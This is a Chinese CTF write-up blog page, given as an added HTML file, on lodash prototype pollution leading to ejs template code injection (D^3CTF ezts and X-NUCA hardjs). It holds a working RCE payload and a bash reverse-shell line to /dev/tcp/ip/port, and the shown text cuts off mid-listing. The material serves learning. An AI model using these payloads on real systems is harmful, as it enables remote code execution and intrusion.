@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x02 ezts前置知识如下：Express+lodash+ejs: 从原型链污染到RCE参考链接如下：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6">
+<meta property="og:type" content="article">
+<meta property="og:title" content="D^3CTF的赛后复现二">
+<meta property="og:url" content="http://yoursite.com/2019/12/10/D-3CTF的赛后复现二/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x02 ezts前置知识如下：Express+lodash+ejs: 从原型链污染到RCE参考链接如下：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_10.png">
+<meta property="og:updated_time" content="2019-12-10T05:57:50.573Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="D^3CTF的赛后复现二">
+<meta name="twitter:description" content="前言D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。 0x02 ezts前置知识如下：Express+lodash+ejs: 从原型链污染到RCE参考链接如下：https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/12/10/D-3CTF的赛后复现二/">
+
+
+
+
+
+  <title>D^3CTF的赛后复现二 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/D-3CTF的赛后复现二/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">D^3CTF的赛后复现二</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T13:55:58+08:00">
+                2019-12-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/nodejs-web/" itemprop="url" rel="index">
+                    <span itemprop="name">nodejs-web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  17
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>D^CTF的赛题质量是非常高的，但是比较遗憾在比赛中没有做出了，因此赛后根据大佬们的博客来复现一下。</p>
+<h5 id="0x02-ezts"><a href="#0x02-ezts" class="headerlink" title="0x02 ezts"></a>0x02 ezts</h5><h6 id="前置知识如下："><a href="#前置知识如下：" class="headerlink" title="前置知识如下："></a>前置知识如下：</h6><h6 id="Express-lodash-ejs-从原型链污染到RCE"><a href="#Express-lodash-ejs-从原型链污染到RCE" class="headerlink" title="Express+lodash+ejs: 从原型链污染到RCE"></a>Express+lodash+ejs: 从原型链污染到RCE</h6><h6 id="参考链接如下："><a href="#参考链接如下：" class="headerlink" title="参考链接如下："></a>参考链接如下：</h6><h6 id="https-evi0s-com-2019-08-30-expresslodashejs-e4-bb-8e-e5-8e-9f-e5-9e-8b-e9-93-be-e6-b1-a1-e6-9f-93-e5-88-b0rce"><a href="#https-evi0s-com-2019-08-30-expresslodashejs-e4-bb-8e-e5-8e-9f-e5-9e-8b-e9-93-be-e6-b1-a1-e6-9f-93-e5-88-b0rce" class="headerlink" title="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/"></a><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></h6><h6 id="RCE-的前提是要有原型链污染，原型链污染原理等具体不再赘述"><a href="#RCE-的前提是要有原型链污染，原型链污染原理等具体不再赘述" class="headerlink" title="RCE 的前提是要有原型链污染，原型链污染原理等具体不再赘述"></a>RCE 的前提是要有原型链污染，原型链污染原理等具体不再赘述</h6><h6 id="通过下面的payload来验证当前loadsh库的版本是否有原型链污染。"><a href="#通过下面的payload来验证当前loadsh库的版本是否有原型链污染。" class="headerlink" title="通过下面的payload来验证当前loadsh库的版本是否有原型链污染。"></a>通过下面的payload来验证当前<code>loadsh</code>库的版本是否有原型链污染。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn=<span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload=<span class="string">'&#123;"constructor":&#123;"prototype":&#123;"a0":true&#125;&#125;&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;,<span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span>((&#123;&#125;)[<span class="string">`a0`</span>]===<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
+
+<h6 id="先来个最简单的应用"><a href="#先来个最简单的应用" class="headerlink" title="先来个最简单的应用"></a>先来个最简单的应用</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>);</span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">    .use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">    .use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./'</span>);</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">"/"</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = &#123;&#125;;</span><br><span class="line">    <span class="keyword">let</span> input = <span class="built_in">JSON</span>.parse(req.body.content);</span><br><span class="line">    lodash.defaultsDeep(data, input);</span><br><span class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">"OK"</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> server = app.listen(<span class="number">8086</span>, <span class="string">'0.0.0.0'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Listening on port %d'</span>, server.address().port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="断点打在res-render-39-index-39-这一行，Force-Step-into调试。"><a href="#断点打在res-render-39-index-39-这一行，Force-Step-into调试。" class="headerlink" title="断点打在res.render(&#39;index&#39;)这一行，Force Step into调试。"></a>断点打在<code>res.render(&#39;index&#39;)</code>这一行，Force Step into调试。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_1.png" alt></p>
+<h6 id="可以看到进入了express的response中，获取options，然后触发-app-渲染引擎进行渲染。"><a href="#可以看到进入了express的response中，获取options，然后触发-app-渲染引擎进行渲染。" class="headerlink" title="可以看到进入了express的response中，获取options，然后触发 app 渲染引擎进行渲染。"></a>可以看到进入了express的<code>response</code>中，获取<code>options</code>，然后触发 app 渲染引擎进行渲染。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_2.png" alt></p>
+<h6 id="这里又是一系列参数和设置，可以跳过"><a href="#这里又是一系列参数和设置，可以跳过" class="headerlink" title="这里又是一系列参数和设置，可以跳过"></a>这里又是一系列参数和设置，可以跳过</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_3.png" alt></p>
+<h6 id="这里是寻找-app-的渲染引擎。可以看到已经被配置为了-ejs，传递参数和模版文件，开始尝试渲染。"><a href="#这里是寻找-app-的渲染引擎。可以看到已经被配置为了-ejs，传递参数和模版文件，开始尝试渲染。" class="headerlink" title="这里是寻找 app 的渲染引擎。可以看到已经被配置为了 ejs，传递参数和模版文件，开始尝试渲染。"></a>这里是寻找 app 的渲染引擎。可以看到已经被配置为了 ejs，传递参数和模版文件，开始尝试渲染。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_4.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_5.png" alt></p>
+<h6 id="调用渲染引擎。到这里，我们已经调试到了-ejs-库中。"><a href="#调用渲染引擎。到这里，我们已经调试到了-ejs-库中。" class="headerlink" title="调用渲染引擎。到这里，我们已经调试到了 ejs 库中。"></a>调用渲染引擎。到这里，我们已经调试到了 ejs 库中。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_6.png" alt></p>
+<h6 id="可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到-tryHandleCache。"><a href="#可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到-tryHandleCache。" class="headerlink" title="可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到 tryHandleCache。"></a>可以看到很复杂一坨，都是配置渲染设置，不管他，继续调试到 tryHandleCache。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_7.png" alt></p>
+<h6 id="一堆-Promise-的适配，再看这坨屎一样的-js-我要死了，继续调-handleCache。"><a href="#一堆-Promise-的适配，再看这坨屎一样的-js-我要死了，继续调-handleCache。" class="headerlink" title="一堆 Promise 的适配，再看这坨屎一样的 js 我要死了，继续调 handleCache。"></a>一堆 Promise 的适配，再看这坨屎一样的 js 我要死了，继续调 handleCache。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_8.png" alt></p>
+<h6 id="是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。"><a href="#是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。" class="headerlink" title="是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。"></a>是缓存设置，没啥用，终于调到了编译函数，开始渲染页面了。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_9.png" alt></p>
+<h6 id="又是设置，跳过，看到实例化一个模版类，然后调用模版的-compile-成员函数，继续跟进。"><a href="#又是设置，跳过，看到实例化一个模版类，然后调用模版的-compile-成员函数，继续跟进。" class="headerlink" title="又是设置，跳过，看到实例化一个模版类，然后调用模版的 compile 成员函数，继续跟进。"></a>又是设置，跳过，看到实例化一个模版类，然后调用模版的 compile 成员函数，继续跟进。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/XNUCA2019_hardjs_debug_10.png" alt></p>
+<h6 id="看到这里，立刻发现这里有一个代码注入的漏洞"><a href="#看到这里，立刻发现这里有一个代码注入的漏洞" class="headerlink" title="看到这里，立刻发现这里有一个代码注入的漏洞"></a>看到这里，立刻发现这里有一个代码注入的漏洞</h6><h6 id="仔细解释一下："><a href="#仔细解释一下：" class="headerlink" title="仔细解释一下："></a>仔细解释一下：</h6><h6 id="可以看到，-opts-对象-outputFunctionName-成员在-express-配置的时候并没有给他赋值，默认也是未定义，即-undefined，这样在-574-行时，if-判否，跳过"><a href="#可以看到，-opts-对象-outputFunctionName-成员在-express-配置的时候并没有给他赋值，默认也是未定义，即-undefined，这样在-574-行时，if-判否，跳过" class="headerlink" title="可以看到， opts 对象 outputFunctionName 成员在 express 配置的时候并没有给他赋值，默认也是未定义，即 undefined，这样在 574 行时，if 判否，跳过"></a>可以看到， opts 对象 outputFunctionName 成员在 express 配置的时候并没有给他赋值，默认也是未定义，即 undefined，这样在 574 行时，if 判否，跳过</h6><h6 id="但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给-Object-类创建一个成员-outputFunctionName，这样可以进入-if-语句，并将我们控制的成员-outputFunctionName-赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的-RCE"><a href="#但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给-Object-类创建一个成员-outputFunctionName，这样可以进入-if-语句，并将我们控制的成员-outputFunctionName-赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的-RCE" class="headerlink" title="但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给 Object 类创建一个成员 outputFunctionName，这样可以进入 if 语句，并将我们控制的成员 outputFunctionName 赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的 RCE"></a>但是在我们有原型链污染的前提之下，我们可以控制基类的成员。这样我们给 Object 类创建一个成员 outputFunctionName，这样可以进入 if 语句，并将我们控制的成员 outputFunctionName 赋值为一串恶意代码，从而造成代码注入。在后面模版渲染的时候，注入的代码被执行，也就是这里存在一个代码注入的 RCE</h6><h6 id="至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码"><a href="#至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码" class="headerlink" title="至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码"></a>至于恶意代码构造就非常简单了。在不考虑后果的情况下，我们可以直接构造如下代码</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a; return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;whoami&apos;); //</span><br></pre></td></tr></table></figure>
+
+<h6 id="放到代码里面看就是"><a href="#放到代码里面看就是" class="headerlink" title="放到代码里面看就是"></a>放到代码里面看就是</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prepended += &apos;  var &apos; + opts.outputFunctionName + &apos; = __append;&apos; + &apos;\n&apos;;</span><br><span class="line">// After injection</span><br><span class="line">prepended += &apos; var a; return global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;whoami&quot;); // 后面的代码都被注释了&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="拿到shell的代码如下："><a href="#拿到shell的代码如下：" class="headerlink" title="拿到shell的代码如下："></a>拿到shell的代码如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a; return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;bash -c &quot;/bin/bash -i &gt; /dev/tcp/ip/port 0&lt;&amp;1 2&gt;&amp;1&quot;&apos;); //</span><br></pre></td></tr></table></figure>
+
+<h6 id="可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前-return，从而-getshell"><a href="#可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前-return，从而-getshell" class="headerlink" title="可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前 return，从而 getshell"></a>可想而知，在污染了原型链之后，渲染直接变成了执行代码，并提前 return，从而 getshell</h6><h6 id="注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。"><a href="#注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。" class="headerlink" title="注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。"></a>注明：上面的过程是我根据，大佬的过程自己走过的，原文链接在上面提供了。</h6><h6 id="由于出题人还没有放出环境，那么以后再复现，由于与X-NUCA-2019-hardjs知识点差不多，因此选择复现hardjs。"><a href="#由于出题人还没有放出环境，那么以后再复现，由于与X-NUCA-2019-hardjs知识点差不多，因此选择复现hardjs。" class="headerlink" title="由于出题人还没有放出环境，那么以后再复现，由于与X-NUCA 2019 hardjs知识点差不多，因此选择复现hardjs。"></a>由于出题人还没有放出环境，那么以后再复现，由于与<code>X-NUCA 2019 hardjs</code>知识点差不多，因此选择复现<code>hardjs</code>。</h6><h5 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h5><h6 id="题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server-js和robot-py。"><a href="#题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server-js和robot-py。" class="headerlink" title="题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是server.js和robot.py。"></a>题目直接给了源码，所以可以进行一下审计。打开源码目录，最显眼的就是<code>server.js</code>和<code>robot.py</code>。</h6><h6 id="先分析一下server-js。大概的源码已加注释。"><a href="#先分析一下server-js。大概的源码已加注释。" class="headerlink" title="先分析一下server.js。大概的源码已加注释。"></a>先分析一下<code>server.js</code>。大概的源码已加注释。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span 